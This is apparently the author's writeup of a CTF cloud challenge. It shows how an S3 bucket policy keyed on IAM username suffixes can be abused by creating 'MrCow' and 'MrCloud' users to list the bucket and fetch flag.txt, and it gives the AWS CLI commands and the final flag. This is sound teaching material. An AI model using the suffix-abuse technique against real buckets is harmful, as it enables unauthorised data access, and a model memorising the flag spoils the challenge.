# Writeup — Iam Mr. Cow or Mr. Cloud

## Summary

The bucket policy keys entirely on IAM **username suffixes**. Any user whose ARN ends in `MrCow` can inspect bucket metadata (policy, ACL, location) and list its objects, while `MrCloud` identities can fetch exactly one file: `flag.txt`. Nothing else is exposed publicly, so players discover the mechanic by using the AWS CLI to read the bucket policy—no special tagging or hidden hints.

## What the player sees

Opening `public/index.html` loads an SVG from `https://mr-cow-or-mr-cloud-secret-20250916-a1.s3.us-east-1.amazonaws.com/assets/cowcloud.svg`. That leak gives solvers the bucket name and region but nothing else. They must turn to AWS CLI reconnaissance.

## Intended path

1. Forge a IAM user whose name ends with `MrCow`, configure its credentials, and probe the bucket: `aws s3 ls s3://mr-cow-or-mr-cloud-secret-20250916-a1/ --profile cow` now works, showing `flag.txt` and any other hidden keys. Attempting to download the flag still fails for this identity.
2. Forge a sibling IAM user whose name ends with `MrCloud`, configure a third CLI profile, and note that `aws s3 ls` keeps failing. However, `aws s3 cp s3://mr-cow-or-mr-cloud-secret-20250916-a1/flag.txt - --profile cloud` succeeds because the policy allows `s3:GetObject` for `*MrCloud` principals.
3. Combine the two identities: MrCow enumerates; MrCloud steals.

## Step-by-step solution

Set helpers:

```bash
BUCKET="mr-cow-or-mr-cloud-secret-20250916-a1"
REGION="us-east-1"
```

### Recon with Mr. Cow

```bash
aws sts get-caller-identity --profile cow
aws s3 ls "s3://$BUCKET/" --profile cow --region "$REGION"
aws s3 cp "s3://$BUCKET/flag.txt" - --profile cow --region "$REGION" || true
```

Result: listing succeeds; flag download still fails.

### Heist with Mr. Cloud

```bash
aws sts get-caller-identity --profile cloud
aws s3 ls "s3://$BUCKET/" --profile cloud --region "$REGION" || true
aws s3 cp "s3://$BUCKET/flag.txt" - --profile cloud --region "$REGION"
```

Result: listing denied, but copying the flag prints the contents.

## Final flag

```
cuhk25ctf{m00n_m45k5_h1d3_th3_cl0ud_g4t3s}
```

## Validation matrix

* **MrCow user**: `s3 ls` ✅, `s3 cp flag` ❌
* **MrCloud user**: `s3 ls` ❌, `s3 cp flag` ✅
* **Other principals**: all actions ❌